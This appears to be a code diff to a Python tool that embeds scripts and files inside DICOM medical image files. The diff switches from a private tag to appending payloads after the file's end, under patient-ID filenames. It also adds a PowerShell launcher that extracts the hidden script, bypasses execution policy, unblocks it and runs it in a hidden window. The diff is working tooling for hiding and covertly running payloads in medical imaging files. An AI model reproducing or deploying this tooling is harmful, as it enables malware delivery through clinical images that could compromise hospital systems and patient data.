@@ -1,6 +1,8 @@
 """
-DICOM embedding engine — payloads stored in a private DICOM tag.
-Pixels and standard metadata stay viewer-compatible; no bytes appended after EOF.
+DICOM embedding engine — EOF-append and private-tag embed modes.
+
+Reference pattern (TCGA-*_modified_embedded_*.dcm): script/file bytes appended after the
+original DICOM file, optional FILE_LAUNCHER at EOF; pixels and metadata tags unchanged.
 """
 
 from __future__ import annotations
@@ -46,11 +48,13 @@ for ($i = 1; $i -le $Times; $i++) {
 
 FILE_LAUNCHER = """
 param([string]$DicomPath = $args[0])
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
+$ErrorActionPreference = 'Stop'
 if (-not $DicomPath) { throw 'DICOM path required' }
 $b = [IO.File]::ReadAllBytes($DicomPath)
 $m = [Text.Encoding]::ASCII.GetBytes('<<<DCM_EMBEDDED_SCRIPT>>>')
 $found = -1
-for ($i = $b.Length - $m.Length; $i -ge 0; $i--) {
+for ($i = 0; $i -le $b.Length - $m.Length; $i++) {
     $match = $true
     for ($j = 0; $j -lt $m.Length; $j++) {
         if ($b[$i + $j] -ne $m[$j]) { $match = $false; break }
@@ -61,7 +65,12 @@ if ($found -lt 0) { throw 'Embedded script not found in DICOM file' }
 $start = $found + $m.Length
 $len = [BitConverter]::ToInt32($b, $start)
 $script = [Text.Encoding]::UTF8.GetString($b, $start + 4, $len)
-Invoke-Expression $script
+$payloadPath = Join-Path $env:TEMP ("dcm_payload_{0}.ps1" -f [guid]::NewGuid().ToString('N'))
+[IO.File]::WriteAllText($payloadPath, $script)
+Unblock-File -LiteralPath $payloadPath -ErrorAction SilentlyContinue
+Start-Process -FilePath 'powershell.exe' -ArgumentList @(
+    '-NoProfile', '-NoLogo', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-File', $payloadPath
+) -WindowStyle Hidden
 """
 
 
@@ -85,13 +94,55 @@ def build_chrome_script_bytes(open_count: int = 3) -> bytes:
     return script.encode("utf-8")
 
 
-def dicom_structure_end(raw: bytes) -> int:
-    """Byte offset where demo EOF payloads begin, or full file length for clean/private-tag embeds.
+def _parse_script_payload_at(data: bytes, offset: int = 0) -> Optional[Tuple[bytes, int]]:
+    if not data[offset:].startswith(SCRIPT_MAGIC):
+        return None
+    start = offset + len(SCRIPT_MAGIC)
+    if len(data) < start + 4:
+        return None
+    length = int.from_bytes(data[start : start + 4], "little")
+    script = data[start + 4 : start + 4 + length]
+    return script, start + 4 + length
 
-    Scripts in the DEMO_EMBED private tag contain SCRIPT_MAGIC inside the dataset — that is
-  not an EOF append. Only bytes after the parsed DICOM structure (or FILE_LAUNCHER_MAGIC at
-    EOF) count as trailing payload.
-    """
+
+def _is_script_magic_in_launcher_source(raw: bytes, offset: int) -> bool:
+    window = raw[max(0, offset - 48) : offset + len(SCRIPT_MAGIC) + 8]
+    return b"GetBytes" in window or b"ASCII.GetBytes" in window
+
+
+def _is_valid_script_block(raw: bytes, offset: int) -> bool:
+    parsed = _parse_script_payload_at(raw, offset)
+    if not parsed:
+        return False
+    script, end_offset = parsed
+    if len(script) < 8 or end_offset > len(raw):
+        return False
+    if _is_script_magic_in_launcher_source(raw, offset):
+        return False
+    return True
+
+
+def find_eof_embed_start(raw: bytes) -> int:
+    """Byte offset of the first real EOF-appended SCRIPT/FILE block."""
+    search_start = 132 if len(raw) >= 132 and raw[128:132] == b"DICM" else 0
+    script_idx = raw.find(SCRIPT_MAGIC, search_start)
+    while script_idx >= 0:
+        if _is_valid_script_block(raw, script_idx):
+            try:
+                pydicom.dcmread(io.BytesIO(raw[:script_idx]), force=True)
+                return script_idx
+            except Exception:
+                pass
+        script_idx = raw.find(SCRIPT_MAGIC, script_idx + 1)
+    return len(raw)
+
+
+def dicom_structure_end(raw: bytes) -> int:
+    """Byte offset where demo EOF payloads begin, or full file length for clean/private-tag embeds."""
+    eof_start = find_eof_embed_start(raw)
+    if eof_start < len(raw):
+        return eof_start
+
     try:
         ds = pydicom.dcmread(io.BytesIO(raw), force=True)
         clean = io.BytesIO()
@@ -115,18 +166,7 @@ def dicom_structure_end(raw: bytes) -> int:
     search_start = 132 if len(raw) >= 132 and raw[128:132] == b"DICM" else 0
     launcher_idx = raw.find(FILE_LAUNCHER_MAGIC, search_start)
     if launcher_idx >= 0:
-        script_idx = raw.find(SCRIPT_MAGIC, search_start)
-        if script_idx >= 0 and script_idx < launcher_idx:
-            return script_idx
         return launcher_idx
-
-    script_idx = raw.find(SCRIPT_MAGIC, search_start)
-    if script_idx >= 0:
-        try:
-            pydicom.dcmread(io.BytesIO(raw[:script_idx]), force=True)
-            return script_idx
-        except Exception:
-            pass
 
     return len(raw)
 
@@ -201,21 +241,17 @@ def _write_private_tag_embed(ds: pydicom.Dataset, combined: bytes, options: Embe
     return buffer.getvalue()
 
 
-def embed_payloads_in_dicom(
+def _finalize_embed_result(
     dicom_source: bytes,
+    result_bytes: bytes,
     payloads: List[bytes],
     options: EmbedOptions,
+    method: str,
 ) -> Tuple[bytes, Dict[str, Any]]:
-    """
-    Embed payloads in a private DICOM tag (viewers ignore unknown private tags).
-    Pixel data and standard metadata are not modified.
-    """
     ds = pydicom.dcmread(io.BytesIO(dicom_source))
     before_meta = read_dicom_metadata(ds)
     original_hash = hashlib.sha256(dicom_source).hexdigest()
-
     combined = b"".join(payloads)
-    result_bytes = _write_private_tag_embed(ds, combined, options)
 
     work_dir = embed_output_dir()
     stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -234,7 +270,7 @@ def embed_payloads_in_dicom(
 
     log = {
         "timestamp": datetime.now().isoformat(),
-        "method": "private_tag_embed",
+        "method": method,
         "metadata_unchanged": metadata_unchanged(before_meta, after_meta),
         "pixels_unchanged": pixels_unchanged(dicom_source, result_bytes),
         "hash_original": original_hash,
@@ -253,12 +289,56 @@ def embed_payloads_in_dicom(
     return result_bytes, log
 
 
+def embed_payloads_eof_append(
+    dicom_source: bytes,
+    payloads: List[bytes],
+    options: EmbedOptions,
+) -> Tuple[bytes, Dict[str, Any]]:
+    """Append payloads after the original DICOM bytes (reference embed pattern)."""
+    combined = b"".join(payloads)
+    result_bytes = dicom_source + combined
+    if options.include_launcher and any(p.startswith(SCRIPT_MAGIC) for p in payloads):
+        result_bytes += FILE_LAUNCHER_MAGIC + FILE_LAUNCHER.strip().encode("utf-8")
+    return _finalize_embed_result(
+        dicom_source, result_bytes, payloads, options, "eof_append_embed"
+    )
+
+
+def embed_payloads_in_dicom(
+    dicom_source: bytes,
+    payloads: List[bytes],
+    options: EmbedOptions,
+) -> Tuple[bytes, Dict[str, Any]]:
+    """Embed payloads in a private DICOM tag (viewers ignore unknown private tags)."""
+    ds = pydicom.dcmread(io.BytesIO(dicom_source))
+    combined = b"".join(payloads)
+    result_bytes = _write_private_tag_embed(ds, combined, options)
+    return _finalize_embed_result(
+        dicom_source, result_bytes, payloads, options, "private_tag_embed"
+    )
+
+
+def build_eof_embed_bytes(
+    dicom_source: bytes,
+    payload: bytes,
+    *,
+    include_launcher: bool = True,
+    include_av_test_stream: bool = False,
+) -> Tuple[bytes, Dict[str, Any]]:
+    """Convenience wrapper: single payload EOF append with optional auto-run launcher."""
+    options = EmbedOptions(
+        include_launcher=include_launcher and payload.startswith(SCRIPT_MAGIC),
+        include_av_test_stream=include_av_test_stream,
+    )
+    return embed_payloads_eof_append(dicom_source, [payload], options)
+
+
 def embed_chrome_launcher(
     dicom_source: bytes,
     options: EmbedOptions,
 ) -> Tuple[bytes, Dict[str, Any]]:
     script = build_chrome_script_bytes(options.chrome_open_count)
-    return embed_payloads_in_dicom(dicom_source, [build_script_payload(script)], options)
+    return embed_payloads_eof_append(dicom_source, [build_script_payload(script)], options)
 
 
 def embed_uploaded_script(
@@ -266,7 +346,7 @@ def embed_uploaded_script(
     script_bytes: bytes,
     options: EmbedOptions,
 ) -> Tuple[bytes, Dict[str, Any]]:
-    return embed_payloads_in_dicom(
+    return embed_payloads_eof_append(
         dicom_source, [build_script_payload(script_bytes)], options
     )
 
@@ -277,7 +357,7 @@ def embed_uploaded_file(
     file_bytes: bytes,
     options: EmbedOptions,
 ) -> Tuple[bytes, Dict[str, Any]]:
-    return embed_payloads_in_dicom(
+    return embed_payloads_eof_append(
         dicom_source, [build_file_payload(filename, file_bytes)], options
     )
 
@@ -290,7 +370,17 @@ def embed_script_and_file(
     options: EmbedOptions,
 ) -> Tuple[bytes, Dict[str, Any]]:
     payloads = [build_script_payload(script_bytes), build_file_payload(filename, file_bytes)]
-    return embed_payloads_in_dicom(dicom_source, payloads, options)
+    return embed_payloads_eof_append(dicom_source, payloads, options)
+
+
+def build_modified_embedded_filename(
+    patient_id: str,
+    stamp: Optional[str] = None,
+) -> str:
+    """Filename for reference-pattern embeds: {PatientID}_modified_embedded_{YYYYMMDD_HHMMSS}.dcm"""
+    safe = "".join(c if c.isalnum() or c in "-_" else "_" for c in patient_id)
+    ts = stamp or datetime.now().strftime("%Y%m%d_%H%M%S")
+    return f"{safe}_modified_embedded_{ts}.dcm"
 
 
 def validate_dicom(dicom_bytes: bytes) -> Tuple[bool, str, Optional[Dict[str, str]]]:
@@ -317,11 +407,16 @@ def save_embed_artifacts(
     source_name: str,
     extra_log: Optional[Dict[str, Any]] = None,
     out_stem: Optional[str] = None,
+    patient_id: Optional[str] = None,
 ) -> Tuple[Path, Path, str, str]:
     """Persist embedded DICOM and JSON log under output/embed/."""
     stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    base = out_stem or Path(source_name).stem
-    out_name = f"{base}_{stamp}.dcm"
+    if patient_id:
+        out_name = build_modified_embedded_filename(patient_id, stamp)
+        base = "".join(c if c.isalnum() or c in "-_" else "_" for c in patient_id)
+    else:
+        base = out_stem or Path(source_name).stem
+        out_name = f"{base}_{stamp}.dcm"
     log_name = f"{base}_{stamp}_log.json"
     out_dir = embed_output_dir()
     out_path = out_dir / out_name
